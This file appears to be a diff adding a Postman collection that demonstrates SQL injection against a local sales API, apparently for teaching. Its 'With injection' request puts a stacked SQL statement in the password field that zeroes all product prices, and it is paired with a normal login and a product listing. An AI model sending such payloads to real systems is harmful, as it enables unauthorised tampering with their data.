@@ -1,0 +1,89 @@
+{
+	"info": {
+		"_postman_id": "9b7c71dc-a54d-422e-b6ec-6a6892d46980",
+		"name": "sql-injection",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "24934162"
+	},
+	"item": [
+		{
+			"name": "With injection",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n    \"nomeCliente\": \"'Ana'\",\r\n    \"senha\": \"'123'; UPDATE produto SET val_unit = 0.0\"\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://localhost:8080/api-vendas/login/with-injection",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"api-vendas",
+						"login",
+						"with-injection"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Normal",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n    \"nomeCliente\": \"Ana\",\r\n    \"senha\": \"123\"\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://localhost:8080/api-vendas/login",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"api-vendas",
+						"login"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "getProducts",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://localhost:8080/api-vendas/produto",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"api-vendas",
+						"produto"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
